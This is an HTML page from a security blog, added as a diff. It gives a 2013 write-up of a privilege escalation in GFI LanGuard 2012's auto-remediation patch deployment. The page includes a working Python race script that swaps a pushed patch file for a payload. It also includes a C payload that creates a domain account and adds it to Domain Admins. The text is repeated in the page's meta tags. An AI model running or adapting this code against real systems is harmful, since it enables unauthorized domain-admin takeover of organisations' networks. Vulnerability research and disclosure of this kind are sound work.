@@ -1,0 +1,331 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>GFI LanGuard 2012 Priviledge Escalation - RabbidByte</title>
+<meta name="description" content="Downloadhttps://github.com/RabbidByte/GFI2012-PrivilegeEscalationWhat is GFI LanGuard 2012?GFI LanGuard 2012 http://www.gfi.com/network-security-vulnerability-scanner is a software package that competes with Microsoft SCCM. This software is placed in a network environment to inventory hardware, software, perform basic vulnerability assessment, and manage the software packages on the computers within the network. At the time of writing this article the current version in 2012.LanGuard is actually quite a nice product. Sure it does have some issues like the amount of bandwidth required between sites, but all in all it gives an administrator great insight into what is actually out on their network. However we all know that not all administrators are created equally.In order for this hack to work an admin is required to implement a poor configuration. Luckily for you GFI provides absolutely no training for this product and there were no other third party training programs found either. So that basically leaves your admin to read the PDF’s supplied by GFI at http://www.gfi.com/network-security-vulnerability-scanner/manual Now ask yourself, would your admin read these? Probably not because the software is so intuitive that installation and roll out is really point and click.How it worksLanGuard has a very handy feature called auto remediation. This feature will push updates approved by the administrator to the machines out in the network. When the process begins the updated packages are copied to the local machine and then executed. The patches are installed and the user can be sent a prompt to restart the machine.When we first started looking at a way to hack this process we had no idea it would be so simple. There is absolutely no integrity check on the files before they are executed. So really what is to stop someone from changing the contents of the files before they are executed? Nothing. However GFI copies the files into the folder C:\Windows\Patches which has local security policies on it. This is the reason why local administrator privileges are required.Once you alter the files and the GFI process has copied all patches to the machine an on the fly batch file is created and the files are executed. So don’t change the file name or it won’t get run.Here is what we did to inject our own file content. First a listener program is launched to monitor the contents of the Patches directory. Once it sees that there are two files in the directory (meaning one has been written and the second is probably still being written to and locked) it will overwrite the first file with the payload file.The payload file in this example is really nothing special. Hell this whole hack is not special … we had such high hopes for it too. Either way the executable adds an AD account and gives it some nice domain permissions. Once it is run … try out your new account.Requirements for Hack to be SuccessfulAs previously mentioned there are some settings and requirements needed for this hack to work. So here they are.  Attacker must have local admin on a windows box that is joined to the same domain as GFI. This is really not hard to get. If you don’t know how to get local admin just check Google.  The administrator MUST have configured a Domain Account in the Auto Remediation Settings. The hack will be able to elevate privileges to the level of this account.The Fileslistener.py&#39;&#39;&#39;Created on Dec 21, 2012@author: RabbidByte (previously Essential Exploit Labs)&#39;&#39;&#39;import os, shutilpath=&quot;C:\\Windows\\Patches\\&quot;payload=&quot;payload.exe&quot;hook=0files = []dirList=os.listdir(path)for fname in dirList:    fileToDelete = path    fileToDelete += fname    os.remove(fileToDelete)fname = Nonewhile hook==0:    dirList = None    dirList=os.listdir(path)    for fname in dirList:        if fname.endswith(&quot;.exe&quot;):            if fname not in (files):                files.append(fname)    if len(files) &gt; 1:        print &quot;We got the Files &quot;        print files[0]        print &quot;and &quot;        print files[1]        print &quot;Time to launch payload!&quot;        hook=1fReplace = pathfReplace += files[0]shutil.copy(payload, fReplace)payload.c// payload.cpp // RabbidByte (previously Essential Exploit Labs)#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;void exploit(){	system(&quot;net user admlnlstrator MyPassw0rd /add /domain&quot;);	system(&quot;net group \&quot;Domain Admins\&quot; admlnlstrator /add /domain&quot;);}int _tmain(int argc, _TCHAR* argv[]){	exploit();	return 0;}NOTES  Due to the special requirements needed for this to work we have labeled it as a hack and not an exploit.  Many networks have systems that alert admins when powerful AD accounts are created. You will probably get busted if you try to use this the way it is.  As always the author of this article is not responsible for how you use this information.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="RabbidByte">
+<meta property="og:title" content="GFI LanGuard 2012 Priviledge Escalation">
+<meta property="og:url" content="http://192.168.1.30:4000/GFI-LanGuard-2012-Priviledge-Escalation.html">
+
+
+  <meta property="og:description" content="Downloadhttps://github.com/RabbidByte/GFI2012-PrivilegeEscalationWhat is GFI LanGuard 2012?GFI LanGuard 2012 http://www.gfi.com/network-security-vulnerability-scanner is a software package that competes with Microsoft SCCM. This software is placed in a network environment to inventory hardware, software, perform basic vulnerability assessment, and manage the software packages on the computers within the network. At the time of writing this article the current version in 2012.LanGuard is actually quite a nice product. Sure it does have some issues like the amount of bandwidth required between sites, but all in all it gives an administrator great insight into what is actually out on their network. However we all know that not all administrators are created equally.In order for this hack to work an admin is required to implement a poor configuration. Luckily for you GFI provides absolutely no training for this product and there were no other third party training programs found either. So that basically leaves your admin to read the PDF’s supplied by GFI at http://www.gfi.com/network-security-vulnerability-scanner/manual Now ask yourself, would your admin read these? Probably not because the software is so intuitive that installation and roll out is really point and click.How it worksLanGuard has a very handy feature called auto remediation. This feature will push updates approved by the administrator to the machines out in the network. When the process begins the updated packages are copied to the local machine and then executed. The patches are installed and the user can be sent a prompt to restart the machine.When we first started looking at a way to hack this process we had no idea it would be so simple. There is absolutely no integrity check on the files before they are executed. So really what is to stop someone from changing the contents of the files before they are executed? Nothing. However GFI copies the files into the folder C:\Windows\Patches which has local security policies on it. This is the reason why local administrator privileges are required.Once you alter the files and the GFI process has copied all patches to the machine an on the fly batch file is created and the files are executed. So don’t change the file name or it won’t get run.Here is what we did to inject our own file content. First a listener program is launched to monitor the contents of the Patches directory. Once it sees that there are two files in the directory (meaning one has been written and the second is probably still being written to and locked) it will overwrite the first file with the payload file.The payload file in this example is really nothing special. Hell this whole hack is not special … we had such high hopes for it too. Either way the executable adds an AD account and gives it some nice domain permissions. Once it is run … try out your new account.Requirements for Hack to be SuccessfulAs previously mentioned there are some settings and requirements needed for this hack to work. So here they are.  Attacker must have local admin on a windows box that is joined to the same domain as GFI. This is really not hard to get. If you don’t know how to get local admin just check Google.  The administrator MUST have configured a Domain Account in the Auto Remediation Settings. The hack will be able to elevate privileges to the level of this account.The Fileslistener.py&#39;&#39;&#39;Created on Dec 21, 2012@author: RabbidByte (previously Essential Exploit Labs)&#39;&#39;&#39;import os, shutilpath=&quot;C:\\Windows\\Patches\\&quot;payload=&quot;payload.exe&quot;hook=0files = []dirList=os.listdir(path)for fname in dirList:    fileToDelete = path    fileToDelete += fname    os.remove(fileToDelete)fname = Nonewhile hook==0:    dirList = None    dirList=os.listdir(path)    for fname in dirList:        if fname.endswith(&quot;.exe&quot;):            if fname not in (files):                files.append(fname)    if len(files) &gt; 1:        print &quot;We got the Files &quot;        print files[0]        print &quot;and &quot;        print files[1]        print &quot;Time to launch payload!&quot;        hook=1fReplace = pathfReplace += files[0]shutil.copy(payload, fReplace)payload.c// payload.cpp // RabbidByte (previously Essential Exploit Labs)#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;void exploit(){	system(&quot;net user admlnlstrator MyPassw0rd /add /domain&quot;);	system(&quot;net group \&quot;Domain Admins\&quot; admlnlstrator /add /domain&quot;);}int _tmain(int argc, _TCHAR* argv[]){	exploit();	return 0;}NOTES  Due to the special requirements needed for this to work we have labeled it as a hack and not an exploit.  Many networks have systems that alert admins when powerful AD accounts are created. You will probably get busted if you try to use this the way it is.  As always the author of this article is not responsible for how you use this information.">
+
+
+
+
+
+  <meta name="twitter:site" content="@RabbidByte">
+  <meta name="twitter:title" content="GFI LanGuard 2012 Priviledge Escalation">
+  <meta name="twitter:description" content="Downloadhttps://github.com/RabbidByte/GFI2012-PrivilegeEscalationWhat is GFI LanGuard 2012?GFI LanGuard 2012 http://www.gfi.com/network-security-vulnerability-scanner is a software package that competes with Microsoft SCCM. This software is placed in a network environment to inventory hardware, software, perform basic vulnerability assessment, and manage the software packages on the computers within the network. At the time of writing this article the current version in 2012.LanGuard is actually quite a nice product. Sure it does have some issues like the amount of bandwidth required between sites, but all in all it gives an administrator great insight into what is actually out on their network. However we all know that not all administrators are created equally.In order for this hack to work an admin is required to implement a poor configuration. Luckily for you GFI provides absolutely no training for this product and there were no other third party training programs found either. So that basically leaves your admin to read the PDF’s supplied by GFI at http://www.gfi.com/network-security-vulnerability-scanner/manual Now ask yourself, would your admin read these? Probably not because the software is so intuitive that installation and roll out is really point and click.How it worksLanGuard has a very handy feature called auto remediation. This feature will push updates approved by the administrator to the machines out in the network. When the process begins the updated packages are copied to the local machine and then executed. The patches are installed and the user can be sent a prompt to restart the machine.When we first started looking at a way to hack this process we had no idea it would be so simple. There is absolutely no integrity check on the files before they are executed. So really what is to stop someone from changing the contents of the files before they are executed? Nothing. However GFI copies the files into the folder C:\Windows\Patches which has local security policies on it. This is the reason why local administrator privileges are required.Once you alter the files and the GFI process has copied all patches to the machine an on the fly batch file is created and the files are executed. So don’t change the file name or it won’t get run.Here is what we did to inject our own file content. First a listener program is launched to monitor the contents of the Patches directory. Once it sees that there are two files in the directory (meaning one has been written and the second is probably still being written to and locked) it will overwrite the first file with the payload file.The payload file in this example is really nothing special. Hell this whole hack is not special … we had such high hopes for it too. Either way the executable adds an AD account and gives it some nice domain permissions. Once it is run … try out your new account.Requirements for Hack to be SuccessfulAs previously mentioned there are some settings and requirements needed for this hack to work. So here they are.  Attacker must have local admin on a windows box that is joined to the same domain as GFI. This is really not hard to get. If you don’t know how to get local admin just check Google.  The administrator MUST have configured a Domain Account in the Auto Remediation Settings. The hack will be able to elevate privileges to the level of this account.The Fileslistener.py&#39;&#39;&#39;Created on Dec 21, 2012@author: RabbidByte (previously Essential Exploit Labs)&#39;&#39;&#39;import os, shutilpath=&quot;C:\\Windows\\Patches\\&quot;payload=&quot;payload.exe&quot;hook=0files = []dirList=os.listdir(path)for fname in dirList:    fileToDelete = path    fileToDelete += fname    os.remove(fileToDelete)fname = Nonewhile hook==0:    dirList = None    dirList=os.listdir(path)    for fname in dirList:        if fname.endswith(&quot;.exe&quot;):            if fname not in (files):                files.append(fname)    if len(files) &gt; 1:        print &quot;We got the Files &quot;        print files[0]        print &quot;and &quot;        print files[1]        print &quot;Time to launch payload!&quot;        hook=1fReplace = pathfReplace += files[0]shutil.copy(payload, fReplace)payload.c// payload.cpp // RabbidByte (previously Essential Exploit Labs)#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;void exploit(){	system(&quot;net user admlnlstrator MyPassw0rd /add /domain&quot;);	system(&quot;net group \&quot;Domain Admins\&quot; admlnlstrator /add /domain&quot;);}int _tmain(int argc, _TCHAR* argv[]){	exploit();	return 0;}NOTES  Due to the special requirements needed for this to work we have labeled it as a hack and not an exploit.  Many networks have systems that alert admins when powerful AD accounts are created. You will probably get busted if you try to use this the way it is.  As always the author of this article is not responsible for how you use this information.">
+  <meta name="twitter:url" content="http://192.168.1.30:4000/GFI-LanGuard-2012-Priviledge-Escalation.html">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2013-02-05T00:00:00-07:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://192.168.1.30:4000/GFI-LanGuard-2012-Priviledge-Escalation.html">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "RabbidByte",
+      "url": "http://192.168.1.30:4000/",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="RabbidByte Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+<link rel="apple-touch-icon" sizes="180x180" href="/assets/fav/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/fav/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/fav/favicon-16x16.png">
+<link rel="manifest" href="/assets/fav/site.webmanifest">
+<link rel="mask-icon" href="/assets/fav/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--splash">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/88x88.png" alt=""></a>
+        
+        <a class="site-title" href="/">RabbidByte</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/index.html" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tools.html" >Tools</a>
+            </li><li class="masthead__menu-item">
+              <a href="/ctf.html" >CtF</a>
+            </li><li class="masthead__menu-item">
+              <a href="/resources.html" >Resources</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about.html" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+<div id="main" role="main">
+  <article class="splash" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="GFI LanGuard 2012 Priviledge Escalation">
+    <meta itemprop="description" content="Downloadhttps://github.com/RabbidByte/GFI2012-PrivilegeEscalationWhat is GFI LanGuard 2012?GFI LanGuard 2012 http://www.gfi.com/network-security-vulnerability-scanner is a software package that competes with Microsoft SCCM. This software is placed in a network environment to inventory hardware, software, perform basic vulnerability assessment, and manage the software packages on the computers within the network. At the time of writing this article the current version in 2012.LanGuard is actually quite a nice product. Sure it does have some issues like the amount of bandwidth required between sites, but all in all it gives an administrator great insight into what is actually out on their network. However we all know that not all administrators are created equally.In order for this hack to work an admin is required to implement a poor configuration. Luckily for you GFI provides absolutely no training for this product and there were no other third party training programs found either. So that basically leaves your admin to read the PDF’s supplied by GFI at http://www.gfi.com/network-security-vulnerability-scanner/manual Now ask yourself, would your admin read these? Probably not because the software is so intuitive that installation and roll out is really point and click.How it worksLanGuard has a very handy feature called auto remediation. This feature will push updates approved by the administrator to the machines out in the network. When the process begins the updated packages are copied to the local machine and then executed. The patches are installed and the user can be sent a prompt to restart the machine.When we first started looking at a way to hack this process we had no idea it would be so simple. There is absolutely no integrity check on the files before they are executed. So really what is to stop someone from changing the contents of the files before they are executed? Nothing. However GFI copies the files into the folder C:\Windows\Patches which has local security policies on it. This is the reason why local administrator privileges are required.Once you alter the files and the GFI process has copied all patches to the machine an on the fly batch file is created and the files are executed. So don’t change the file name or it won’t get run.Here is what we did to inject our own file content. First a listener program is launched to monitor the contents of the Patches directory. Once it sees that there are two files in the directory (meaning one has been written and the second is probably still being written to and locked) it will overwrite the first file with the payload file.The payload file in this example is really nothing special. Hell this whole hack is not special … we had such high hopes for it too. Either way the executable adds an AD account and gives it some nice domain permissions. Once it is run … try out your new account.Requirements for Hack to be SuccessfulAs previously mentioned there are some settings and requirements needed for this hack to work. So here they are.  Attacker must have local admin on a windows box that is joined to the same domain as GFI. This is really not hard to get. If you don’t know how to get local admin just check Google.  The administrator MUST have configured a Domain Account in the Auto Remediation Settings. The hack will be able to elevate privileges to the level of this account.The Fileslistener.py&#39;&#39;&#39;Created on Dec 21, 2012@author: RabbidByte (previously Essential Exploit Labs)&#39;&#39;&#39;import os, shutilpath=&quot;C:\\Windows\\Patches\\&quot;payload=&quot;payload.exe&quot;hook=0files = []dirList=os.listdir(path)for fname in dirList:    fileToDelete = path    fileToDelete += fname    os.remove(fileToDelete)fname = Nonewhile hook==0:    dirList = None    dirList=os.listdir(path)    for fname in dirList:        if fname.endswith(&quot;.exe&quot;):            if fname not in (files):                files.append(fname)    if len(files) &gt; 1:        print &quot;We got the Files &quot;        print files[0]        print &quot;and &quot;        print files[1]        print &quot;Time to launch payload!&quot;        hook=1fReplace = pathfReplace += files[0]shutil.copy(payload, fReplace)payload.c// payload.cpp // RabbidByte (previously Essential Exploit Labs)#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;void exploit(){	system(&quot;net user admlnlstrator MyPassw0rd /add /domain&quot;);	system(&quot;net group \&quot;Domain Admins\&quot; admlnlstrator /add /domain&quot;);}int _tmain(int argc, _TCHAR* argv[]){	exploit();	return 0;}NOTES  Due to the special requirements needed for this to work we have labeled it as a hack and not an exploit.  Many networks have systems that alert admins when powerful AD accounts are created. You will probably get busted if you try to use this the way it is.  As always the author of this article is not responsible for how you use this information.">
+    <meta itemprop="datePublished" content="February 05, 2013">
+    
+
+    <section class="page__content" itemprop="text">
+      <h2 id="download">Download</h2>
+
+<p><a href="https://github.com/RabbidByte/GFI2012-PrivilegeEscalation">https://github.com/RabbidByte/GFI2012-PrivilegeEscalation</a></p>
+
+<h2 id="what-is-gfi-languard-2012">What is GFI LanGuard 2012?</h2>
+<p>GFI LanGuard 2012 <a href="http://www.gfi.com/network-security-vulnerability-scanner">http://www.gfi.com/network-security-vulnerability-scanner</a> is a software package that competes with Microsoft SCCM. This software is placed in a network environment to inventory hardware, software, perform basic vulnerability assessment, and manage the software packages on the computers within the network. At the time of writing this article the current version in 2012.</p>
+
+<p>LanGuard is actually quite a nice product. Sure it does have some issues like the amount of bandwidth required between sites, but all in all it gives an administrator great insight into what is actually out on their network. However we all know that not all administrators are created equally.</p>
+
+<p>In order for this hack to work an admin is required to implement a poor configuration. Luckily for you GFI provides absolutely no training for this product and there were no other third party training programs found either. So that basically leaves your admin to read the PDF’s supplied by GFI at <a href="http://www.gfi.com/network-security-vulnerability-scanner/manual">http://www.gfi.com/network-security-vulnerability-scanner/manual</a> Now ask yourself, would your admin read these? Probably not because the software is so intuitive that installation and roll out is really point and click.</p>
+
+<h2 id="how-it-works">How it works</h2>
+<p>LanGuard has a very handy feature called auto remediation. This feature will push updates approved by the administrator to the machines out in the network. When the process begins the updated packages are copied to the local machine and then executed. The patches are installed and the user can be sent a prompt to restart the machine.</p>
+
+<p>When we first started looking at a way to hack this process we had no idea it would be so simple. There is absolutely no integrity check on the files before they are executed. So really what is to stop someone from changing the contents of the files before they are executed? Nothing. However GFI copies the files into the folder C:\Windows\Patches which has local security policies on it. This is the reason why local administrator privileges are required.</p>
+
+<p>Once you alter the files and the GFI process has copied all patches to the machine an on the fly batch file is created and the files are executed. So don’t change the file name or it won’t get run.</p>
+
+<p>Here is what we did to inject our own file content. First a listener program is launched to monitor the contents of the Patches directory. Once it sees that there are two files in the directory (meaning one has been written and the second is probably still being written to and locked) it will overwrite the first file with the payload file.</p>
+
+<p>The payload file in this example is really nothing special. Hell this whole hack is not special … we had such high hopes for it too. Either way the executable adds an AD account and gives it some nice domain permissions. Once it is run … try out your new account.</p>
+
+<h2 id="requirements-for-hack-to-be-successful">Requirements for Hack to be Successful</h2>
+<p>As previously mentioned there are some settings and requirements needed for this hack to work. So here they are.</p>
+
+<ol>
+  <li>Attacker must have local admin on a windows box that is joined to the same domain as GFI. This is really not hard to get. If you don’t know how to get local admin just check Google.</li>
+  <li>The administrator MUST have configured a Domain Account in the Auto Remediation Settings. The hack will be able to elevate privileges to the level of this account.</li>
+</ol>
+
+<p><img src="/assets/images/gfi/Login.png" alt="alt text" title="Login" /></p>
+
+<h2 id="the-files">The Files</h2>
+<p>listener.py</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">'''
+Created on Dec 21, 2012
+@author: RabbidByte (previously Essential Exploit Labs)
+'''</span>
+<span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">shutil</span>
+<span class="n">path</span><span class="o">=</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Patches</span><span class="se">\\</span><span class="s">"</span>
+<span class="n">payload</span><span class="o">=</span><span class="s">"payload.exe"</span>
+<span class="n">hook</span><span class="o">=</span><span class="mi">0</span>
+<span class="n">files</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="n">dirList</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">fname</span> <span class="ow">in</span> <span class="n">dirList</span><span class="p">:</span>
+    <span class="n">fileToDelete</span> <span class="o">=</span> <span class="n">path</span>
+    <span class="n">fileToDelete</span> <span class="o">+=</span> <span class="n">fname</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">fileToDelete</span><span class="p">)</span>
+<span class="n">fname</span> <span class="o">=</span> <span class="bp">None</span>
+
+<span class="k">while</span> <span class="n">hook</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
+    <span class="n">dirList</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="n">dirList</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">fname</span> <span class="ow">in</span> <span class="n">dirList</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">fname</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">".exe"</span><span class="p">):</span>
+            <span class="k">if</span> <span class="n">fname</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="n">files</span><span class="p">):</span>
+                <span class="n">files</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">fname</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">files</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">"We got the Files "</span>
+        <span class="k">print</span> <span class="n">files</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="k">print</span> <span class="s">"and "</span>
+        <span class="k">print</span> <span class="n">files</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="k">print</span> <span class="s">"Time to launch payload!"</span>
+        <span class="n">hook</span><span class="o">=</span><span class="mi">1</span>
+
+<span class="n">fReplace</span> <span class="o">=</span> <span class="n">path</span>
+<span class="n">fReplace</span> <span class="o">+=</span> <span class="n">files</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">shutil</span><span class="o">.</span><span class="n">copy</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">fReplace</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>payload.c</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// payload.cpp </span>
+<span class="c1">// RabbidByte (previously Essential Exploit Labs)</span>
+
+<span class="cp">#include "stdafx.h"
+#include &lt;Windows.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">exploit</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="n">system</span><span class="p">(</span><span class="s">"net user admlnlstrator MyPassw0rd /add /domain"</span><span class="p">);</span>
+	<span class="n">system</span><span class="p">(</span><span class="s">"net group </span><span class="se">\"</span><span class="s">Domain Admins</span><span class="se">\"</span><span class="s"> admlnlstrator /add /domain"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">_tmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">_TCHAR</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+	<span class="n">exploit</span><span class="p">();</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="notes">NOTES</h2>
+<ol>
+  <li>Due to the special requirements needed for this to work we have labeled it as a hack and not an exploit.</li>
+  <li>Many networks have systems that alert admins when powerful AD accounts are created. You will probably get busted if you try to use this the way it is.</li>
+  <li>As always the author of this article is not responsible for how you use this information.</li>
+</ol>
+
+    </section>
+  </article>
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2019 RabbidByte. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
